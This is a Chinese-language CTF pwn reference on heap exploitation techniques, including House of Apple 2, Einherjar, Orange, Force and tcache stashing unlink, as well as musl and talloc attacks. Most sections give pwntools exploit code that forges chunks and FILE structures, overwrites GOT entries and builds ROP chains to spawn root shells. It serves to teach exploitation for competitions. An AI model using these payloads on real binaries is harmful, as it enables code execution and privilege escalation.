# CTF Pwn - Heap 技巧

## 目录
- [House of Apple 2 — 适用于 glibc 2.34+ 的 FSOP（0xFun 2026）](#house-of-apple-2--fsop-for-glibc-234-0xfun-2026)
  - [SUID 二进制的 setcontext 变体（Midnight Flag 2026）](#setcontext-variant-for-suid-binaries-midnight-flag-2026)
- [House of Einherjar — Off-by-One 空字节漏洞（0xFun 2026）](#house-of-einherjar--off-by-one-null-byte-0xfun-2026)
- [堆利用](#heap-exploitation)
  - [通过应用操作进行堆整理（Codegate 2013）](#heap-grooming-via-application-operations-codegate-2013)
- [自定义分配器利用](#custom-allocator-exploitation)
  - [talloc 池头伪造实现任意读写（Boston Key Party 2016）](#talloc-pool-header-forgery-for-arbitrary-readwrite-boston-key-party-2016)
- [经典堆 unlink 攻击（Crypto-Cat）](#classic-heap-unlink-attack-crypto-cat)
- [musl libc 堆利用 — 元指针 + atexit（UNbreakable 2026）](#musl-libc-heap-exploitation--meta-pointer--atexit-unbreakable-2026)
- [House of Orange](#house-of-orange)
- [House of Spirit](#house-of-spirit)
- [House of Lore](#house-of-lore)
- [House of Force（CSAW CTF 2016）](#house-of-force-csaw-ctf-2016)
- [tcache 缓存 unlink 攻击](#tcache-stashing-unlink-attack)
- [不安全 unlink 到 BSS + 顶块合并（SECCON 2016）](#unsafe-unlink-to-bss--top-chunk-consolidation-seccon-2016)

关于 CTF 特定的 UAF、tcache 和自定义分配器写作变体——UAF vtable 指针编码、未初始化 chunk 残留泄露、tcache strcpy 空字节溢出、相邻结构函数指针溢出、隐藏菜单 tcache 污染、tcache 双重释放 stdout 劫持、tcache 到 fastbin 促销、6 位 OOB 累加器、IS_MMAPED 位翻转、文件名正则 LSB fastbin 和自定义分配器不安全 unlink——请参见 [heap-techniques-2.md](heap-techniques-2.md)。

关于 FILE 结构（_IO_FILE）利用——fastbin stdout vtable 劫持、_IO_buf_base 空字节覆盖、glibc 2.24+ vtable 验证绕过、unsorted-bin 攻击 stdin FILE 字段、realloc-as-free UAF 和引用计数回绕——请参见 [heap-fsop.md](heap-fsop.md)。

---

## House of Apple 2 — 适用于 glibc 2.34+ 的 FSOP（0xFun 2026）

**使用时机：** 现代 glibc（2.34+）移除了 `__free_hook`/`__malloc_hook`。House of Apple 2 通过 `_IO_wfile_jumps` 利用 FSOP。

**完整链条：** UAF → 泄露 libc（unsorted bin fd/bk）→ 泄露堆（safe-linking 混淆的 NULL）→ tcache 污染到 `_IO_list_all` → 伪造 FILE → exit 触发 shell。

**伪造 FILE 结构要求：**
```python
fake_file = flat({
    0x00: b' sh\x00',           # _flags = " sh\x00" (fp 以 " sh" 开头)
    0x20: p64(0),                # _IO_write_base = 0
    0x28: p64(1),                # _IO_write_ptr = 1 (> _IO_write_base)
    0x88: p64(heap_addr),        # _lock（有效的可写地址）
    0xa0: p64(wide_data_addr),   # _wide_data 指针
    0xd8: p64(io_wfile_jumps),   # vtable = _IO_wfile_jumps
}, filler=b'\x00')

fake_wide_data = flat({
    0x18: p64(0),                # _IO_write_base = 0
    0x30: p64(0),                # _IO_buf_base = 0
    0xe0: p64(fake_wide_vtable), # _wide_vtable
})

fake_wide_vtable = flat({
    0x68: p64(libc.sym.system),  # __doallocate 偏移
})
```

**触发链：** `exit()` → `_IO_flush_all_lockp` → `_IO_wfile_overflow` → `_IO_wdoallocbuf` → `_IO_WDOALLOCATE(fp)` → `system(fp)`，其中 fp = `" sh\x00..."`。

**Safe-linking（glibc 2.32+）：** tcache fd 指针被混淆：`fd = ptr ^ (chunk_addr >> 12)`。要污染 tcache：
```python
# 写入已释放 chunk 时，混淆目标地址：
mangled_fd = target_addr ^ (current_chunk_addr >> 12)
```
### setcontext 变体用于 SUID 二进制文件（Midnight Flag 2026）

在利用 SUID-root 二进制文件时，`system("/bin/sh")` 会失败，因为 dash 在 `uid != euid` 时会降低权限。将 `system(fp)` 替换为 `setcontext(fp)`，以切换到先调用 `setuid(0)` 的 ROP 链：

```python
# Wide vtable 目标为 setcontext 而非 system
fake_wide_vtable = flat({
    0x68: p64(libc.sym.setcontext + 61),  # __doallocate → setcontext
})

# setcontext 从相对于 RDX（指向 fp->_wide_data）的偏移加载寄存器：
#   RSP 从 [rdx+0xa0]，RIP 从 [rdx+0xa8]，RDI 从 [rdx+0x68]
# 将 ROP 链放置在 _wide_data 结构：
fake_wide_data = flat({
    0x18: p64(0),                     # _IO_write_base = 0
    0x30: p64(0),                     # _IO_buf_base = 0
    0x68: p64(0),                     # RDI = 0（用于 setuid(0)）
    0xa0: p64(rop_chain_addr),        # RSP = 跳转到 ROP 链
    0xa8: p64(libc.sym.setuid),       # RIP = setuid 作为第一个调用
    0xe0: p64(fake_wide_vtable_addr), # _wide_vtable
})

# ROP 链位于 rop_chain_addr：
rop = flat([
    pop_rdi_ret,
    libc.address + 0,               # setuid(0) 返回后跳转到这里
    # ... 额外设置 ...
    libc.sym.system,
    next(libc.search(b"/bin/sh\x00")),
])
```

**触发链：** `exit()` → `_IO_wfile_overflow` → `_IO_wdoallocbuf` → `setcontext(fp)` → 栈切换 → `setuid(0)` → `system("/bin/sh")`。

**关键洞察：** `setcontext` 是通用的栈切换 gadget —— 它从受控内存加载 RSP、RDI 和 RIP，允许从基于 FILE 的漏洞执行任意 ROP。对于 dash 强制 `uid == euid` 的 SUID 二进制文件至关重要。

---

## House of Einherjar — Off-by-One 空字节漏洞（0xFun 2026）

**漏洞：** 在 `malloc_usable_size` 末尾的 off-by-one NUL 清除下一个 chunk 的 `PREV_INUSE` 位。

**利用链：**
1. 设置下一个 chunk 的 `prev_size` 以制造伪造的向后合并
2. 伪造 largebin 风格的 chunk，`fd/bk` 和 `fd_nextsize/bk_nextsize` 全部指向自身（通过 `unlink_chunk()` 检查）
3. 合并后，重叠 chunk 允许 tcache 污染
4. 覆盖 `stdout` 或 `_IO_list_all` 以实现 FSOP

**关键要求：** 自指向 unlink 技巧必不可少。伪造的 chunk 必须通过 `unlink_chunk()`，该函数检查 `FD->bk == P && BK->fd == P`，并且（对于大 chunk）`fd_nextsize->bk_nextsize == P && bk_nextsize->fd_nextsize == P`：

```python
# 伪造 chunk 布局（位于已知堆地址 fake_addr）：
#   chunk 头部：
#     prev_size:      不关心
#     size:           target_size | PREV_INUSE  （必须匹配合并计算）
#     fd:             fake_addr   （自引用）
#     bk:             fake_addr   （自引用）
#     fd_nextsize:    fake_addr   （自引用，大 chunk 需要）
#     bk_nextsize:    fake_addr   （自引用）

fake_chunk = flat({
    0x00: p64(0),                # prev_size
    0x08: p64(target_size | 1),  # size，设置 PREV_INUSE 位
    0x10: p64(fake_addr),        # fd -> 自身
    0x18: p64(fake_addr),        # bk -> 自身
    0x20: p64(fake_addr),        # fd_nextsize -> 自身
    0x28: p64(fake_addr),        # bk_nextsize -> 自身
}, filler=b'\x00')

# 受害 chunk 的 prev_size 必须等于 fake_chunk 到受害 chunk 的距离
# off-by-one NUL 清除受害 chunk 的 PREV_INUSE 位
# free(受害 chunk) 触发向后合并：与 fake_chunk 合并
# 结果：合并后的 chunk 与其他活跃分配重叠
```

**设置步骤：**
1. 分配 chunk A（大，存放伪造 chunk）、B（填充）、C（带 off-by-one 的受害 chunk）
2. 在 A 中写入带自引用指针的伪造 chunk
3. 在 C 上触发 off-by-one，清除 B 的 PREV_INUSE 并设置 B 的 prev_size
4. 释放 B → 向后合并到 A → 产生重叠 chunk
5. 在重叠区域分配，控制其他活跃 chunk

---
## Heap Exploitation

- tcache 污染（glibc 2.26+）
- fastbin dup / double free
- House of Force（旧版 glibc）
- Unsorted bin 攻击
- 检查 glibc 版本：`strings libc.so.6 | grep GLIBC`

**通过未初始化内存泄露堆信息：**
- 错误信息输出用户数据可能包含已释放 chunk 的元数据
- 已释放的 chunk 包含 libc 指针（unsorted bin 中的 fd/bk）
- sprintf/strcpy 缺少 null 终止符导致泄露相邻内存
- 触发错误条件以泄露 libc/heap 基址

**Heap feng shui（堆风水）：**
- 通过控制分配顺序/大小来安排堆布局
- 通过分配然后释放创建特定大小的空洞
- 将目标结构放置在溢出源的相邻位置
- 使用带增量偏移的喷射模式（例如 0x200 步长）

### 通过应用操作进行 Heap Grooming（Codegate 2013）

**模式：** 多步骤的应用层操作（在论坛、留言板或笔记应用中创建/回复/删除）以实现可控的堆状态用于利用。

**技术：**
1. 创建 N 条带有溢出 payload 的条目，溢出发生在作者/标题/内容字段
2. 为每条条目填充回复缓冲区（例如 127 条 `"sh"` 回复），将可控数据放置在可预测的堆位置
3. 有选择地删除条目以创建特定的堆空洞
4. 分配新的条目，落在已释放的 chunk 中，与存活的元数据重叠

```python
# 示例：Codegate 2013 漏洞 400 — 基于留言板的堆整理
# 第一步：创建 7 条内容字段溢出的帖子
for i in range(7):
    create_post("YOLO", "YOLO",
        "A" * 36 + pack("I", got_addr) +    # 作者溢出
        "A" * 604 + pack("I", got_addr) +    # 内容溢出
        pack("I", plt_addr) * 80)            # 喷射 GOT 目标

# 第二步：填充回复缓冲区以堆喷射 "sh" 字符串
for i in range(7):
    for j in range(127):
        reply_to_post(i, "sh")

# 第三步：删除 7 条中的 5 条以创建特定堆空洞
for i in [0, 1, 2, 3, 4]:
    delete_post(i)

# 第四步：在释放空间中分配 2 条新条目
create_post(payload_a, payload_b, payload_c)
create_post(payload_d, payload_e, payload_f)

# 第五步：通过修改 + 删除序列触发
modify_post(target_id, trigger_payload)
delete_post(target_id)  # 触发 GOT 覆盖 → shell
```

**关键洞察：** 应用操作（创建、回复、删除、修改）映射到可预测大小的堆分配和释放。通过控制操作的顺序和次数，实现与直接堆操作相同的效果，但通过应用自身接口完成。

## 自定义分配器利用

应用可能使用自定义分配器（nginx 内存池、Apache apr、游戏引擎）：

**nginx 内存池结构：**
- 内存池通过析构回调函数链式分配
- `ngx_destroy_pool()` 遍历清理处理器
- 溢出覆盖析构函数指针及参数
- 内存池释放时调用 `system(受控字符串)`

**通用方法：**
1. 逆向分配器元数据布局
2. 找到结构中的析构函数/回调指针
3. 溢出破坏指针及第一个参数
4. 触发释放调用受控函数

```python
# nginx 内存池利用模式
payload = flat({
    0x00: cmd * (0x800 // len(cmd)),      # 命令字符串
    0x800: [libc.sym.system, HEAP + OFF] * 0x80,  # 析构函数喷射
    0x1010: [0x1020, 0x1011],              # 内存池元数据
    0x1010+0x50: [HEAP + OFF + 0x800]      # 清理处理器指针
}, length=0x1200)
```

### talloc 内存池头伪造实现任意读写（Boston Key Party 2016）

**模式：** talloc 是分层内存分配器（用于 Samba、CUPS 等）。伪造带受控字段的假内存池头，将分配重定向到任意地址。

```c
// talloc 内存池头字段：end, object_count, hdr_fill
// 后接 talloc_chunk：next, prev, parent, child, refs, name, size, flags, pool
// 设置内存池边界跨越目标地址
// 下一次分配返回攻击者控制地址
// 读取 GOT 泄露 libc，写入 __free_hook 替换为 system()
```

**利用步骤：**
1. 通过应用数据泄露堆地址
2. 伪造 talloc 内存池头，`end` 指向目标地址之后
3. 下一次 `talloc()` 调用返回攻击者选定位置的内存
4. 利用任意读（GOT）泄露 libc，任意写覆盖钩子

**关键洞察：** 自定义分配器的内存池元数据控制未来分配位置。talloc 的分层父子结构意味着破坏一个头会影响整个分配树。

**参考资料：** Boston Key Party 2016
## 经典堆 unlink 攻击 (Crypto-Cat)

**使用时机：** 旧版 glibc (< 2.26，无 tcache) 或教学性质的堆挑战。通过溢出一个堆块的元数据，破坏下一个堆块的 `prev_size` 和 `size` 字段，然后在 `free()` 时触发 unlink，写入任意值到任意地址。

**dlmalloc unlink 工作原理：**
```c
// 当 free() 与相邻的空闲块合并时：
// FD = P->fd, BK = P->bk
// FD->bk = BK    (写 BK 到 FD + 偏移)
// BK->fd = FD    (写 FD 到 BK + 偏移)
// 这是一个写什么到哪里的原语
```

**利用模式：**
1. 分配两个相邻的堆块（A 和 B）
2. 溢出 A 的数据到 B 的堆块头部：
   - 将 B 的 `prev_size` 设置为 A 的数据大小（伪造“前一个块是空闲的”）
   - 清除 B 的 `size` 字段中的 `PREV_INUSE` 位
   - 在 A 的数据区域构造伪造的 `fd` 和 `bk` 指针
3. 释放 B → `free()` 认为 A 也空闲，触发向后合并 → 对伪造块执行 unlink

```python
from pwn import *

# A 数据区域中的伪造块
fake_fd = target_addr - 0x18  # GOT 条目 - 3*sizeof(ptr)
fake_bk = target_addr - 0x10  # GOT 条目 - 2*sizeof(ptr)

# 从 A 溢出到 B 的头部
payload = p64(0)              # A 的伪造 prev_size
payload += p64(data_size)     # A 的伪造 size（标记 A 为“空闲”）
payload += p64(fake_fd)       # fd 指针
payload += p64(fake_bk)       # bk 指针
payload += b'A' * (data_size - 32)  # 填充 A 的数据
payload += p64(data_size)     # 覆盖 B 的 prev_size
payload += p64(b_size & ~1)   # 覆盖 B 的 size，清除 PREV_INUSE 位

# 释放 B 后：target_addr 现在包含我们控制的指针
```

**现代防护：** glibc 2.26+ 添加了安全 unlink 检查（`FD->bk == P && BK->fd == P`）。对于现代堆，建议使用 tcache 污染、House of Apple 2 或 House of Einherjar 等技术。

**关键洞察：** unlink 宏执行两次指针写入。通过控制伪造块的 `fd` 和 `bk`，可以获得受限的写什么到哪里的能力：每个位置写入另一个指针的值。经典用途是用 win 函数或 shellcode 地址覆盖 GOT 条目。

---

## musl libc 堆利用 — Meta Pointer + atexit (UNbreakable 2026)

**模式（非典型堆）：** 二进制链接了 musl libc（非 glibc）。musl 的分配器使用 `meta` 结构代替堆块头。OOB 读取泄露 `meta->mem` 指针；任意写重定向分配到受控地址。

**musl 分配器布局：**
- 每个分配属于一个 `group`，由 `meta` 结构管理
- `meta->mem` 指向该组的数据区域
- 第一个 `0x70` 类分配使 `meta0->mem` 位于 PIE 基址的固定偏移处（例如 `chall_base + 0x3f20`）

**利用链：**
1. **泄露 meta 指针** — 在堆分配的偏移 `0x80` 处进行 OOB 读取，读取 `meta` 结构指针
2. **恢复 PIE 基址** — `meta0->mem` 位于二进制基址的固定偏移
3. **重定向分配** — 覆盖 `meta->mem` 指向一个活跃组或目标地址。该组的下一次分配返回攻击者控制的内存
4. **atexit 劫持** — 覆盖 musl 的 `atexit` 处理程序列表为 `system("cat flag")`。程序正常退出时触发代码执行

```python
# 通过 OOB 读取泄露 meta 指针
meta_ptr = leak_at_offset(0x80)
pie_base = meta_ptr - 0x3f20  # 第一个 0x70 分配的固定偏移

# 重写 meta->mem 以重定向未来分配
write_at(meta_ptr + META_MEM_OFFSET, target_addr)

# 下一次分配返回 target_addr — 用于覆盖 atexit 处理程序
alloc_and_write(atexit_list_addr, system_addr, "cat flag")
```

**关键洞察：** musl 的分配器元数据（`meta` 结构）与堆数据分开存储，但可预测的偏移将其与二进制基址关联。与 glibc 不同，musl 没有安全链接或 tcache —— 破坏 `meta->mem` 可直接控制分配。`atexit` 处理程序列表比 glibc 的 `__free_hook`（2.34+ 版本已移除）更简单，是代码执行的目标。

**检测：** 二进制使用 musl libc（检查 `ldd`，或 `strings binary | grep musl`）。菜单式堆挑战，带有读写原语。

---
## House of Orange

**模式：** 触发 unsorted bin 分配而不调用 `free()`。通过堆溢出覆盖 top chunk 的大小为一个较小值。下一次大块分配因 top chunk 不足失败，迫使 `sysmalloc` 将旧的 top chunk 释放到 unsorted bin。然后利用释放的 chunk 进行 FSOP 或 tcache 攻击。

```python
# 第一步：溢出破坏 top chunk 大小
# top chunk 必须设置 PREV_INUSE 且大小对齐到页
# 大小必须距离页边界小于 MINSIZE
edit(0, b'A' * overflow_len + p64(0xc01))  # 伪造小 top chunk

# 第二步：请求大于被破坏 top chunk 大小的分配
# 触发 sysmalloc → 旧 top chunk 被释放到 unsorted bin
add(0x1000, b'B')  # 触发释放

# 第三步：从这里开始进行 unsorted bin 攻击或 FSOP
# 通过 unsorted bin 的 bk 指针覆盖 _IO_list_all
```

**关键洞察：** House of Orange 在不调用 `free()` 的情况下创建了一个空闲 chunk —— 这在二进制没有删除/释放功能时非常关键。被破坏的 top chunk 大小必须满足：`(size & 0xFFF) == 0`（页对齐结尾），`size >= MINSIZE`，且设置了 `PREV_INUSE` 位。

**要求：** 能够溢出到 top chunk 元数据的堆溢出。glibc 版本需低于 2.26 以使用经典变体；现代版本需要 FSOP 链（House of Apple 2）。

---

## House of Spirit

**模式：** 在攻击者控制的内存（栈、.bss 或堆）中伪造一个假 chunk，然后调用 `free()` 将其放入 bin。下一次该大小的分配返回假 chunk，从而获得对目标区域的写权限。

```python
# 在栈上伪造假 fastbin chunk
# 需要有效的 size 字段和下一个 chunk 的大小以通过验证
fake_chunk = flat(
    0,              # prev_size
    0x41,           # size (0x40 + PREV_INUSE) — 必须匹配目标 fastbin
    0, 0, 0, 0, 0, 0,  # 数据区（0x40 大小的 8 个 qword）
    0,              # 下一个 chunk 的 prev_size
    0x41,           # 下一个 chunk 的 size（通过 free() 验证）
)

# 将假 chunk 地址写入二进制会调用 free() 的位置
# 例如覆盖传入 free() 的指针
overwrite_ptr(target_ptr, addr_of_fake_chunk + 0x10)

# 触发 free(target_ptr) → 假 chunk 进入 fastbin
trigger_free()

# 下一次 malloc(0x38) 返回我们的假 chunk → 写入受控区域
malloc_and_write(0x38, payload)
```

**关键洞察：** 关键限制是 `free()` 会验证 chunk 的大小和“下一个”chunk（位于 `chunk + size`）的大小。两者都必须看起来有效 —— 大小在 fastbin 范围内（64 位为 0x20-0x80），且对齐和标志正确。

---

## House of Lore

**模式：** 破坏 smallbin chunk 的 `bk` 指针，使其指向攻击者控制的假 chunk。当 smallbin 用于分配时，假 chunk 被链接进 bin。第二次分配返回假 chunk，从而获得任意写。

```python
# 第一步：释放一个 chunk 到 smallbin（通过 unsorted bin → sorted）
free(chunk_a)
malloc(large_size)  # 触发排序：chunk_a 移入 smallbin

# 第二步：在目标区域伪造假 chunk
# fake->fd 必须指回真实 smallbin chunk
# fake->bk 必须指向另一个看起来有效的 chunk（或自身）
fake = flat(
    0, 0x91,                    # prev_size, size
    addr_of_real_chunk,         # fd → 指回合法 chunk
    addr_of_fake2,              # bk → 另一个假 chunk 或自身
)

# 第三步：覆盖 chunk_a->bk 指向我们的假 chunk
edit_freed_chunk(chunk_a, bk=addr_of_fake)

# 第四步：从该 smallbin 进行两次分配
alloc1 = malloc(0x80)  # 返回 chunk_a（合法）
alloc2 = malloc(0x80)  # 返回我们的假 chunk → 任意写！
```

**关键洞察：** 需要破坏已释放 smallbin chunk 的 `bk`。假 chunk 的 `fd` 必须指回一个其 `bk` 指向假 chunk 的 chunk —— glibc 会检查 `victim->bk->fd == victim`。旧版本 glibc 该检查较弱。

---
## House of Force (CSAW CTF 2016)

**模式：** 覆盖 wilderness（顶）chunk 的 size 字段为一个大值（例如 `0xffffffffffffffff`），然后请求一个精心计算的分配，将堆指针移动到任意地址（例如 GOT 表）。

```python
from pwn import *

elf = ELF('./target')
libc = ELF('./libc.so.6')

# 第一步：溢出到顶 chunk 头部，设置 size 为 -1 (0xffffffffffffffff)
add_card(-1, b'A' * 24 + p64(0xffffffffffffffff))

# 第二步：计算顶 chunk 到目标地址（例如 GOT 条目）的距离
# evil_size = target_address - current_top_chunk_ptr - metadata_size
target = elf.got['strtol']
evil_size = target - 16 - top_chunk_ptr

# 第三步：分配 evil_size 大小，推进顶 chunk 指针到目标地址
add_card(evil_size - 25, b'')

# 第四步：下一次分配覆盖目标 - 写入期望值
# 覆盖 strtol@GOT 为 system() 地址
add_card(100, p64(libc.symbols['system']))

# 第五步：触发 - 下一次调用 strtol(user_input) 实际调用 system(user_input)
io.sendline(b'/bin/sh')
```

**关键洞察：** House of Force 需要：(1) 溢出顶 chunk 以控制其 size 字段，(2) 一次由攻击者控制大小的 malloc 来定位堆，(3) 随后的分配发生在目标地址。适用于 glibc < 2.29 版本，后者增加了顶 chunk size 的校验。

---

## tcache Stashing Unlink 攻击

**模式：** 利用 tcache 在 `malloc()` 时与 smallbin 的交互。当某个大小的 tcache 未满时，`malloc()` 会从 smallbin 中“存储”剩余的 smallbin chunk 到 tcache。在存储过程中，`bk` 指针被跟随但未完全验证，允许将任意地址链接到 tcache。

```python
# 准备：需要 tcache 中有 7 个 chunk（后续排空用）+ smallbin 中有 2 个
# 第二个 smallbin chunk 的 bk 被破坏指向目标地址

# 第一步：填满 tcache 7 个 chunk，然后释放 2 个到 smallbin
for i in range(7):
    free(tcache_chunks[i])
# 这两个先进入 unsorted → 排序后进入 smallbin
free(smallbin_chunk_1)
free(smallbin_chunk_2)
malloc(large)  # 排序 unsorted bin → chunk 进入 smallbin

# 第二步：排空 tcache
for i in range(7):
    malloc(target_size)

# 第三步：破坏 smallbin_chunk_2->bk 指向 (target_addr - 0x10)
# target_addr - 0x10 是因为 tcache 存储用户数据指针在 chunk+0x10
edit_after_free(smallbin_chunk_2, bk=target_addr - 0x10)

# 第四步：从 smallbin 分配
# malloc 返回 smallbin_chunk_1
# 存储机制跟随 bk 链：
#   smallbin_chunk_2 被存入 tcache
#   然后跟随被破坏的 bk → 目标也被存入 tcache！
malloc(target_size)

# 第五步：接下来的两个 malloc：第一个返回 smallbin_chunk_2，第二个返回目标
malloc(target_size)  # 返回 chunk_2
malloc(target_size)  # 返回 target_addr → 任意写！
```

**关键洞察：** 存储过程中，glibc 设置 `bck->fd = bin`（其中 `bck = victim->bk`），实际上向 `target_addr` 写入了 main_arena 指针。这是一个强大的写入任意地址的原语。写入的值是堆/ libc 地址（不可完全控制），但足以破坏 FILE 结构、tcache 元数据或其他堆状态。

**要求：** glibc 2.29+（tcache 与 smallbin 交互）。能够破坏已释放 smallbin chunk 的 `bk` 指针。

---

## Unsafe Unlink 到 BSS + 顶 Chunk 合并 (SECCON 2016)

**模式：** 经典 unsafe unlink 写入自引用指针到 BSS 笔记表后，在 BSS 中构造第二个伪 chunk，其 size 跨越 BSS 地址到堆顶 chunk：`size = (heap_top_addr - bss_fake_addr) | PREV_INUSE`。释放该伪 chunk 会与顶 chunk 合并，实质上将堆的分配基址重定位到 BSS。后续 malloc 返回与全局指针表重叠的内存，实现任意读写。

```python
# 第一步：unsafe unlink 将自指针放置在 bss_table[3]
# 伪 chunk：fd = &bss_table[3] - 0x18, bk = &bss_table[3] - 0x10
add_memo(248, p64(0) + p64(0) + p64(bss_table + 0x100 + 8 - 24) +
         p64(bss_table + 0x100 + 8 - 16) + b'A' * 208 + p64(prev_size))

# 第二步：BSS 伪 chunk，size 跨越到顶 chunk
fake_size = heap_base + 0x310 - bss_addr + 0x1  # | PREV_INUSE
edit_memo(3, b'A' * (256-32) + p64(prev_size) + p64(fake_size) + b'A' * 15)
delete_memo(1)  # 合并将顶 chunk 移动到 BSS

# 第三步：malloc 现在返回 BSS 内存 — 覆盖全局指针
add_memo(size, p64(environ_addr))  # 写入 &environ 到笔记槽
# read_memo 泄露来自 environ 的栈地址
```

**关键洞察：** 标准 unsafe unlink 只提供单次写入原语。此变体通过顶 chunk 合并扩展为完整任意读写：任何后续 `malloc` 返回与 BSS 重叠的内存，将一次写入转变为无限受控的全局数据段分配。

CTF 专用的 UAF、tcache 和自定义分配器写法变体，请继续阅读 [heap-techniques-2.md](heap-techniques-2.md)。
